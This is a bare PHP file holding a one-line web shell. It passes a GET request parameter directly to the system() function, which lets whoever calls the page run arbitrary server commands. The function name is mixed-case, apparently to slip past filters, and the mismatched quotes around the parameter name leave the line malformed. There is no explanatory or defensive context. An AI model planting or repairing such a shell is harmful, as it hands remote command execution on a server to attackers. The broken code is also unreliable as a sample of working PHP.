<?php
SysTeM($_GET["l_2Z-PSJ']);
?>
